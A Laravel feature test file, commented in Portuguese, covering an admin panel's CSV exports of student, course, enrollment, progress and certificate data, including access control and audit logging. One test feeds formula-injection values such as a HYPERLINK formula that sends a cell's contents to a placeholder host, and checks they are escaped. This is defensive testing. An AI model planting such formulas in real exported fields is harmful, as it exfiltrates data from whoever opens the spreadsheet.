<?php

declare(strict_types=1);

namespace Tests\Feature;

use App\Http\Middleware\JwtAuthenticate;
use App\Models\Aula;
use App\Models\Certificado;
use App\Models\Curso;
use App\Models\Matricula;
use App\Models\ProgressoAluno;
use App\Models\Usuario;
use App\Services\BasesGerenciais;
use App\Support\Jwt;
use App\Support\Visibilidade;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Routing\Middleware\ThrottleRequests;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Tests\Support\SeedsIdentity;
use Tests\TestCase;

/**
 * "Dados Gerenciais" do painel administrativo (fatia 7 do M5): as cinco bases em
 * CSV. Quem alimenta Power BI com essas planilhas não pode ver o layout mudar
 * porque a tela mudou de tecnologia — então estes testes espelham os de
 * `managementExport.test.ts` (o gerador antigo), e a conferência linha a linha
 * contra o TypeScript, sobre os dados reais do banco, foi feita à parte.
 */
final class DadosGerenciaisAdminTest extends TestCase
{
    use DatabaseTransactions;
    use SeedsIdentity;

    protected function setUp(): void
    {
        parent::setUp();
        // O limitador `export` tem teste próprio na API; aqui dispararia ao longo do arquivo.
        $this->withoutMiddleware(ThrottleRequests::class);
    }

    private function admin(): string
    {
        return $this->staffToken('admin');
    }

    private function como(string $token): self
    {
        return $this->withUnencryptedCookie(JwtAuthenticate::SESSION_COOKIE, $token);
    }

    private function servico(): BasesGerenciais
    {
        return app(BasesGerenciais::class);
    }

    /** @return array<string,mixed>|null */
    private function linhaDe(string $base, string $coluna, string $valor): ?array
    {
        foreach ($this->servico()->linhas($base) as $linha) {
            if (($linha[$coluna] ?? null) === $valor) {
                return $linha;
            }
        }

        return null;
    }

    private function curso(string $titulo, array $extra = []): Curso
    {
        $curso = Curso::query()->create([
            'id' => 'course-dg-'.uniqid(),
            'titulo' => $titulo,
            'descricao' => 'Descrição do curso para teste.',
            'categoria' => 'Arte',
            'miniatura' => 'sem-imagem.png',
            'nome_instrutor' => 'Prof. Teste',
        ]);
        Curso::query()->whereKey($curso->id)->update(array_merge([
            'slug' => Str::slug($titulo).'-'.Str::lower(Str::random(5)),
            'status' => Visibilidade::PUBLICADO,
        ], $extra));

        return $curso->refresh();
    }

    // ---- o arquivo CSV --------------------------------------------------------
    public function test_o_csv_tem_bom_ponto_e_virgula_e_aspas_so_onde_precisa(): void
    {
        $csv = $this->servico()->csv([
            ['id' => 'a1', 'nome' => 'Silva; João', 'obs' => "duas\nlinhas", 'aspas' => 'diz "oi"', 'vazio' => null, 'ok' => true, 'n' => 80],
        ]);

        $this->assertNotNull($csv);
        $this->assertStringStartsWith("\u{FEFF}id;nome;obs;aspas;vazio;ok;n\n", $csv);
        $this->assertStringContainsString("a1;\"Silva; João\";\"duas\nlinhas\";\"diz \"\"oi\"\"\";;true;80", $csv);
    }

    /**
     * O nome do aluno é digitado por ele mesmo e a planilha é aberta pelo administrador: texto que
     * começa como fórmula tem de virar texto, senão `=HYPERLINK(...)` executa no Excel.
     */
    public function test_texto_que_parece_formula_sai_como_texto_no_csv(): void
    {
        $csv = (string) $this->servico()->csv([
            ['a' => '=HYPERLINK("http://x/?"&A2;"clique")', 'b' => '+cmd', 'c' => '-1+1', 'd' => '@SUM(A1)', 'e' => "\t=1", 'f' => 'normal', 'g' => -5, 'h' => 3.5],
        ]);

        $this->assertStringContainsString("\"'=HYPERLINK(\"\"http://x/?\"\"&A2;\"\"clique\"\")\"", $csv);
        $this->assertStringContainsString(";'+cmd;", $csv);
        $this->assertStringContainsString(";'-1+1;", $csv);
        $this->assertStringContainsString(";'@SUM(A1);", $csv);
        $this->assertStringContainsString(";'\t=1;", $csv);
        // O que não é fórmula, e os números de verdade, ficam como estavam.
        $this->assertStringContainsString(';normal;-5;3.5', $csv);
    }

    public function test_base_sem_registro_nao_gera_arquivo(): void
    {
        $this->assertNull($this->servico()->csv([]));
    }

    // ---- as cinco bases -------------------------------------------------------
    public function test_alunos_trazem_status_e_vazio_quando_o_dado_falta(): void
    {
        $aluno = $this->makeStudent('Aluno Base Qzb');

        $linha = $this->linhaDe('alunos', 'id_aluno', $aluno['id']);

        $this->assertNotNull($linha);
        $this->assertSame(['id_aluno', 'nome', 'email', 'status_conta', 'municipio', 'uf', 'area_de_interesse', 'data_de_cadastro'], array_keys($linha));
        $this->assertSame($aluno['nome'], $linha['nome']);
        $this->assertSame('active', $linha['status_conta']);
        // O painel antigo mostrava "São Paulo"/"SP" quando faltava; o arquivo sempre foi vazio.
        $this->assertSame('', $linha['municipio']);
        $this->assertSame('', $linha['uf']);
    }

    public function test_cursos_usam_o_minimo_do_curso_ou_o_padrao_e_sim_nao_do_certificado(): void
    {
        $a = $this->curso('Curso Base A', ['frequencia_minima' => 80, 'emite_certificado' => false]);
        $b = $this->curso('Curso Base B');

        $linhaA = $this->linhaDe('cursos', 'id_curso', $a->id);
        $linhaB = $this->linhaDe('cursos', 'id_curso', $b->id);

        $this->assertSame(80, (int) $linhaA['percentual_minimo']);
        $this->assertSame('Não', $linhaA['emite_certificado']);
        $this->assertSame(70, $linhaB['percentual_minimo']);
        $this->assertSame('Sim', $linhaB['emite_certificado']);
        $this->assertSame('Prof. Teste', $linhaB['professor_responsavel']);
    }

    public function test_matriculas_geram_a_linha_ativa_e_uma_por_curso_concluido(): void
    {
        $c1 = $this->curso('Curso Ativo Base');
        $c2 = $this->curso('Curso Concluido Com Cert');
        $c3 = $this->curso('Curso Concluido Sem Cert');
        $aluno = $this->makeStudent('Aluno Matriculas Base');
        $matricula = Matricula::query()->create([
            'id' => 'mat-'.uniqid(), 'usuario_id' => $aluno['id'], 'nome_aluno' => $aluno['nome'],
            'curso_matriculado_id' => $c1->id, 'matriculado_em_texto' => '2026-01-10T12:00:00+00:00',
            'cursos_concluidos_ids' => [$c2->id, $c3->id], 'cursos_extras_ids' => [], 'pode_multimatricula' => false,
        ]);
        ProgressoAluno::query()->create([
            'id' => (string) Str::uuid(), 'nome_aluno' => $aluno['nome'], 'usuario_id' => $aluno['id'], 'curso_id' => $c1->id,
            'aulas_concluidas' => ['l1', 'l2'], 'sessoes_ao_vivo_assistidas' => [],
        ]);
        Certificado::query()->create([
            'id' => 'cert-'.uniqid(), 'nome_aluno' => $aluno['nome'], 'usuario_id' => $aluno['id'], 'curso_id' => $c2->id,
            'titulo_curso' => $c2->titulo, 'data_emissao' => '2026-08-01', 'percentual_frequencia' => 100, 'hash_verificacao' => Str::random(20),
        ]);

        $linhas = array_values(array_filter($this->servico()->linhas('matriculas'), static fn (array $l): bool => $l['id_aluno'] === $aluno['id']));

        $this->assertCount(3, $linhas);
        $this->assertSame(['id_matricula', 'id_aluno', 'id_curso', 'data_matricula', 'status_matricula', 'modulos_concluidos', 'certificado_liberado'], array_keys($linhas[0]));
        $this->assertSame([
            'id_matricula' => $matricula->id, 'id_aluno' => $aluno['id'], 'id_curso' => $c1->id, 'data_matricula' => '2026-01-10',
            'status_matricula' => 'Ativa', 'modulos_concluidos' => 2, 'certificado_liberado' => 'Não',
        ], $linhas[0]);
        $this->assertSame($matricula->id.'-C1', $linhas[1]['id_matricula']);
        $this->assertSame('Concluída', $linhas[1]['status_matricula']);
        $this->assertSame('Sim', $linhas[1]['certificado_liberado']);
        $this->assertSame('', $linhas[1]['data_matricula']);
        $this->assertSame('Não', $linhas[2]['certificado_liberado']);
    }

    /**
     * Decidido em 23/10/2026: quem está só num curso CONCORRENTE entra na base de
     * Matrículas (antes ficava de fora, como no painel React). Ninguém consumia
     * a planilha ainda.
     */
    public function test_matricula_so_em_curso_concorrente_entra_na_base(): void
    {
        $extra = $this->curso('Curso So Concorrente');
        $aluno = $this->makeStudent('Aluno So Concorrente Base');
        Matricula::query()->create([
            'id' => 'mat-'.uniqid(), 'usuario_id' => $aluno['id'], 'nome_aluno' => $aluno['nome'],
            'curso_matriculado_id' => null, 'cursos_concluidos_ids' => [], 'cursos_extras_ids' => [$extra->id], 'pode_multimatricula' => true,
        ]);

        $linhas = array_filter($this->servico()->linhas('matriculas'), static fn (array $l): bool => $l['id_aluno'] === $aluno['id']);

        $linhas = array_values($linhas);
        $this->assertCount(1, $linhas);
        $this->assertSame($extra->id, $linhas[0]['id_curso']);
        $this->assertSame('Ativa', $linhas[0]['status_matricula']);
        $this->assertStringEndsWith('-E1', (string) $linhas[0]['id_matricula']);
        $this->assertSame(0, $linhas[0]['modulos_concluidos']);
        $this->assertSame('Não', $linhas[0]['certificado_liberado']);
    }

    public function test_progresso_por_aula_lista_as_aulas_do_curso_na_ordem_e_ignora_curso_fora_do_catalogo(): void
    {
        $curso = $this->curso('Curso Progresso Base');
        Aula::query()->create(['id' => $curso->id.'-b', 'curso_id' => $curso->id, 'titulo' => 'Segunda', 'conteudo' => 'x', 'duracao' => '10', 'ordem' => 2]);
        Aula::query()->create(['id' => $curso->id.'-a', 'curso_id' => $curso->id, 'titulo' => 'Primeira', 'conteudo' => 'x', 'duracao' => '10', 'ordem' => 1]);
        $aluno = $this->makeStudent('Aluno Progresso Base');
        $matricula = Matricula::query()->create([
            'id' => 'mat-'.uniqid(), 'usuario_id' => $aluno['id'], 'nome_aluno' => $aluno['nome'],
            'curso_matriculado_id' => $curso->id, 'cursos_concluidos_ids' => [], 'cursos_extras_ids' => [], 'pode_multimatricula' => false,
        ]);
        $progresso = ProgressoAluno::query()->create([
            'id' => 'prg-'.uniqid(), 'nome_aluno' => $aluno['nome'], 'usuario_id' => $aluno['id'], 'curso_id' => $curso->id,
            'aulas_concluidas' => [$curso->id.'-a'], 'sessoes_ao_vivo_assistidas' => [], 'matricula_id' => $matricula->id,
        ]);
        ProgressoAluno::query()->create([
            'id' => 'prg-'.uniqid(), 'nome_aluno' => $aluno['nome'], 'usuario_id' => $aluno['id'], 'curso_id' => 'curso-que-nao-existe-mais',
            'aulas_concluidas' => [], 'sessoes_ao_vivo_assistidas' => [],
        ]);

        $linhas = array_values(array_filter($this->servico()->linhas('progresso'), static fn (array $l): bool => $l['id_aluno'] === $aluno['id']));

        $this->assertCount(2, $linhas);
        $this->assertSame(['id_progresso', 'id_matricula', 'id_aluno', 'id_curso', 'id_aula', 'titulo_aula', 'status_aula'], array_keys($linhas[0]));
        $this->assertSame($progresso->id.'-'.$curso->id.'-a', $linhas[0]['id_progresso']);
        $this->assertSame('Primeira', $linhas[0]['titulo_aula']);
        $this->assertSame('Concluído', $linhas[0]['status_aula']);
        $this->assertSame('Segunda', $linhas[1]['titulo_aula']);
        $this->assertSame('Não Iniciado', $linhas[1]['status_aula']);
        $this->assertSame($matricula->id, $linhas[0]['id_matricula']);
    }

    public function test_certificados_usam_o_nome_quando_nao_ha_aluno_e_trazem_a_carga_horaria(): void
    {
        $curso = $this->curso('Curso Certificado Base', ['carga_horaria' => 60]);
        $aluno = $this->makeStudent('Aluno Certificado Base');
        Certificado::query()->create([
            'id' => 'cert-com-'.uniqid(), 'nome_aluno' => $aluno['nome'], 'usuario_id' => $aluno['id'], 'curso_id' => $curso->id,
            'titulo_curso' => $curso->titulo, 'data_emissao' => '2026-08-01', 'percentual_frequencia' => 87.5, 'hash_verificacao' => 'AVA-COM',
        ]);
        Certificado::query()->create([
            'id' => 'cert-sem-'.uniqid(), 'nome_aluno' => 'Pessoa Antiga Sem Conta', 'usuario_id' => null, 'curso_id' => $curso->id,
            'titulo_curso' => $curso->titulo, 'data_emissao' => '2026-08-02', 'percentual_frequencia' => 100, 'hash_verificacao' => 'AVA-SEM',
        ]);

        $com = $this->linhaDe('certificados', 'codigo_validacao', 'AVA-COM');
        $sem = $this->linhaDe('certificados', 'codigo_validacao', 'AVA-SEM');

        $this->assertSame(['id_certificado', 'id_matricula', 'id_aluno', 'id_curso', 'codigo_validacao', 'data_emissao', 'percentual_frequencia', 'carga_horaria_certificada'], array_keys($com));
        $this->assertSame($aluno['id'], $com['id_aluno']);
        $this->assertSame(60, $com['carga_horaria_certificada']);
        $this->assertSame('Pessoa Antiga Sem Conta', $sem['id_aluno']);
        $this->assertSame('', $sem['id_matricula']);
    }

    public function test_nenhuma_base_vaza_dado_de_autenticacao(): void
    {
        $this->makeStudent('Aluno Sem Vazamento');

        foreach (array_keys(BasesGerenciais::BASES) as $base) {
            $csv = (string) $this->servico()->csv($this->servico()->linhas($base));
            $this->assertStringNotContainsString('senha_hash', $csv, $base);
            $this->assertStringNotContainsString('$2y$', $csv, $base);
        }
    }

    // ---- a tela e o download --------------------------------------------------
    public function test_so_o_admin_chega_e_baixa(): void
    {
        $aluno = $this->makeStudent('Aluno Dados Acesso');
        $gestor = Usuario::query()->where('papel', 'instructor')->firstOrFail();
        $tokenDoGestor = Jwt::issue($gestor->id, $gestor->nome, 'instructor');

        // O visitante vem primeiro: o cookie de `como()` persiste no cliente de teste.
        $this->get('/admin/dados-gerenciais')->assertRedirect('/entrar');
        $this->get('/admin/dados-gerenciais/baixar/alunos')->assertRedirect('/entrar');
        $this->como($aluno['token'])->get('/admin/dados-gerenciais/baixar/alunos')->assertRedirect('/aluno');
        $this->como($tokenDoGestor)->get('/admin/dados-gerenciais')->assertRedirect('/inst');
        $this->como($tokenDoGestor)->get('/admin/dados-gerenciais/baixar/alunos')->assertRedirect('/inst');
    }

    public function test_a_tela_mostra_as_cinco_bases_e_a_previa(): void
    {
        $this->makeStudent('Aluno Na Previa Qzp');

        $tela = $this->como($this->admin())->get('/admin/dados-gerenciais');

        $tela->assertOk();
        $tela->assertDontSee('<div id="root">', false);
        foreach (['1. Base de Alunos', '2. Base de Cursos', '3. Base de Matrículas', '4. Progresso por Aula', '5. Base de Certificados'] as $rotulo) {
            $tela->assertSee($rotulo);
        }
        $tela->assertSee('Baixar todas as 5 bases (.csv)');
        $tela->assertSee('Exportar esta base (CSV)');
        $tela->assertSee('id_aluno');
        $tela->assertSee('data_de_cadastro');
    }

    public function test_a_previa_e_o_arquivo_saem_da_mesma_fonte(): void
    {
        // O painel antigo mostrava "São Paulo" e "ALU_001" na prévia, que o arquivo nunca teve.
        $this->makeStudent('Aluno Sem Municipio Qzm');

        $tela = $this->como($this->admin())->get('/admin/dados-gerenciais?base=alunos');

        $tela->assertDontSee('ALU_001');
        $tela->assertDontSee('2026-06-01');
    }

    public function test_base_inventada_volta_para_a_primeira_e_o_download_dela_responde_404(): void
    {
        $this->como($this->admin())->get('/admin/dados-gerenciais?base=inventada')->assertRedirect('/admin/dados-gerenciais');
        $this->como($this->admin())->get('/admin/dados-gerenciais/baixar/inventada')->assertNotFound();
        // As bases da API (inglês) não são endereços desta tela.
        $this->como($this->admin())->get('/admin/dados-gerenciais/baixar/students')->assertNotFound();
    }

    public function test_o_download_entrega_o_csv_com_nome_cabecalho_e_auditoria(): void
    {
        $aluno = $this->makeStudent('Aluno No Csv Qzc');

        $resposta = $this->como($this->admin())->get('/admin/dados-gerenciais/baixar/alunos');

        $resposta->assertOk();
        $resposta->assertHeader('Content-Type', 'text/csv; charset=utf-8');
        $resposta->assertHeader('Content-Disposition', 'attachment; filename="base_alunos.csv"');
        $this->assertStringContainsString('no-store', (string) $resposta->headers->get('Cache-Control'));

        $corpo = (string) $resposta->getContent();
        $this->assertStringStartsWith("\u{FEFF}id_aluno;nome;email;status_conta;", $corpo);
        $this->assertStringContainsString($aluno['id'].';'.$aluno['nome'].';', $corpo);

        $this->assertTrue(DB::table('log_seguranca')->where('acao', 'Exportação de Dados Gerenciais')->where('detalhes', 'like', '%"alunos"%')->exists());
    }

    public function test_cada_base_tem_o_nome_de_arquivo_de_sempre(): void
    {
        $nomes = array_map(static fn (array $b): string => $b['arquivo'], BasesGerenciais::BASES);

        $this->assertSame([
            'alunos' => 'base_alunos.csv',
            'cursos' => 'base_cursos.csv',
            'matriculas' => 'base_matriculas.csv',
            'progresso' => 'base_progresso_modulo.csv',
            'certificados' => 'base_certificados.csv',
        ], $nomes);
    }

    public function test_download_de_base_vazia_avisa_ou_responde_204_no_lote(): void
    {
        // Sem matrícula alguma a base de Matrículas fica vazia. Inativa as existentes (nada se apaga, ADR 12),
        // dentro da transação do teste.
        Matricula::query()->get()->each->delete();
        $token = $this->admin();

        $this->como($token)->get('/admin/dados-gerenciais/baixar/matriculas')
            ->assertRedirect('/admin/dados-gerenciais?base=matriculas')->assertSessionHas('avisoDeDados');
        $this->como($token)->get('/admin/dados-gerenciais/baixar/matriculas?lote=1')->assertNoContent();

        $tela = $this->como($token)->get('/admin/dados-gerenciais?base=matriculas');
        $tela->assertSee('Sem registros para exportar');
        $tela->assertSee('Nenhum registro encontrado nesta base atualmente.');
    }

    public function test_a_flag_desligada_responde_404(): void
    {
        config(['features.dadosGerenciais' => false]);

        $this->como($this->admin())->get('/admin/dados-gerenciais')->assertNotFound();
        $this->como($this->admin())->get('/admin/dados-gerenciais/baixar/alunos')->assertNotFound();
    }
}
